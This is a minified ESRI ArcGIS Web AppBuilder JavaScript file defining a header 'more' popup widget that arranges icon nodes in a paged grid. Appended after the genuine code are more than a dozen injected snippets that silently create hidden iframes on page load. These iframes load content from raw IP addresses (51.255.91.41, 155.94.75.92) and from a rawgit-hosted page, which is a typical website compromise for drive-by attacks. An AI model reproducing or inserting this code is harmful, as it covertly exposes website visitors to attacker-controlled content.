// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dojo/dom-construct dojo/query dijit/_WidgetBase dijit/_TemplatedMixin jimu/dijit/ViewStack jimu/utils".split(" "),function(p,k,q,f,m,e,l,r,t,u,n){return p([r,t],{baseClass:"jimu-header-more-popup",templateString:'\x3cdiv\x3e\x3cdiv class\x3d"pages" data-dojo-attach-point\x3d"pagesNode"\x3e\x3c/div\x3e\x3cdiv class\x3d"points jimu-corner-bottom"\x3e\x3cdiv class\x3d"points-inner"data-dojo-attach-point\x3d"pointsNode"\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e',
margin:4,postCreate:function(){this.nodes=[];this.pages=[];this.createCloseBtn()},startup:function(){this.viewStack=new u({views:[],viewType:"dom"},this.pagesNode);this.viewStack.startup();this.resize()},resize:function(){var a=this._calculateGridParam(),c;null!==a?(f.setStyle(this.domNode,n.getPositionStyle(a.position)),this.nodeWidth=a.cellSize-this.margin,this.oldGridParam&&this.oldGridParam.rows===a.rows&&this.oldGridParam.cols===a.cols||(this.clearPages(),this.createPages(a)),this.nodes.forEach(k.hitch(this,
function(b,c){this.setItemNodePosition(b,c,a)})),this.oldGridParam=a,c=l("div.close",this.domNode)[0],f.setStyle(c,{width:.25*this.nodeWidth+"px",height:.25*this.nodeWidth+"px"})):(this.oldGridParam=null,f.setStyle(this.domNode,n.getPositionStyle({left:0,top:0,width:0,height:0,zIndex:111})),this.nodeWidth=0)},setItemNodePosition:function(a,c,b){var d,g,h=48,e=16;d=0===c%b.cols?0:this.margin/2;g=c%(b.rows*b.cols)<b.cols?0:this.margin/2;c={};"number"===typeof this.nodeWidth&&(c.width=this.nodeWidth+
"px",c.height=this.nodeWidth+"px");"number"===typeof d&&(window.isRTL?c.marginRight=d+"px":c.marginLeft=d+"px");"number"===typeof g&&(c.marginTop=g+"px");if(d=l("img",a)[0])b.iconScaled&&(h*=this.nodeWidth/120),f.setStyle(d,{width:h+"px",height:h+"px"});if(h=l("div.node-label",a)[0])b.showLabel?(b.iconScaled&&(e*=this.nodeWidth/120),f.setStyle(h,{"font-size":e+"px",display:"block"})):f.setStyle(h,{"font-size":e+"px",display:"none"});f.setStyle(a,c)},clearPages:function(){q.forEach(this.pages,function(a){this.viewStack.removeView(a.pageNode)},
this);e.empty(this.pointsNode);this.pages=[];this.nodes=[]},createPages:function(a){var c,b,d,g;c=Math.ceil(this.items.length/(a.rows*a.cols));for(b=0;b<c;b++)d=e.create("div",{"class":"page"}),this.createPageItems(b,d,a),this.viewStack.addView(d),1<c&&(g=e.create("div",{"class":"point"},this.pointsNode),this.own(m(g,"click",k.hitch(this,this._onPageNodeClick,b)))),this.pages.push({pageNode:d,pointNode:g});0<this.viewStack.views.length&&this._selectPage(0)},_onPageNodeClick:function(a){this._selectPage(a)},
_selectPage:function(a){1<this.pages.length&&(l(".point",this.domNode).removeClass("point-selected"),f.addClass(this.pages[a].pointNode,"point-selected"));this.viewStack.switchView(this.pages[a].pageNode)},createPageItems:function(a,c,b){var d,g,e;d=this.items.length;g=b.rows*b.cols;b=(a+1)*g;e=b-d;b=Math.min(b,d);for(a*=g;a<b;a++)this.createItemNode(a,c);for(a=d;a<d+e;a++)this.createEmptyItemNode(c)},createItemNode:function(a,c){var b;a=this.items[a];b=e.create("div",{"class":"icon-node jimu-float-leading jimu-main-background",
title:a.label,settingId:a.id,"data-widget-name":a.name},c);e.create("img",{src:a.icon},b);e.create("div",{"class":"node-label",title:a.label,innerHTML:n.stripHTML(a.label)},b);b.config=a;this.own(m(b,"click",k.hitch(this,function(){this.onNodeClicked(b)})));this.nodes.push(b)},createEmptyItemNode:function(a){a=e.create("div",{"class":"icon-node jimu-float-leading jimu-main-background"},a);this.nodes.push(a);return a},createCloseBtn:function(){var a;a=e.create("div",{"class":"close"},this.domNode);
e.create("div",{"class":"close-inner jimu-main-background"},a);m(a,"click",k.hitch(this,function(){this.hide()}));return a},hide:function(){f.setStyle(this.domNode,"display","none")},show:function(){f.setStyle(this.domNode,"display","block")},onNodeClicked:function(a){this.hide()},_calculateGridParam:function(){var a,c,b,d,e=!1,h=!0;a=f.getContentBox(jimuConfig.mapId);c=Math.min(a.w,a.h)-40;if(360<=c)d=120;else{d=Math.floor(c/3);if(10>d)return null;e=!0;80>d&&(h=!1)}c=Math.floor((a.h-40)/d);b=Math.floor((a.w-
40)/d);c=4<c?4:c;c=3>c?3:c;b=3>c?3:4<b?4:b;return{rows:c,cols:b,cellSize:d,iconScaled:e,showLabel:h,position:{top:(a.h-d*c)/2,bottom:(a.h-d*c)/2,left:(a.w-d*b)/2,right:(a.w-d*b)/2,width:d*b-this.margin*(b-1)/2,height:d*c-this.margin*(c-1)/2,zIndex:111}}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});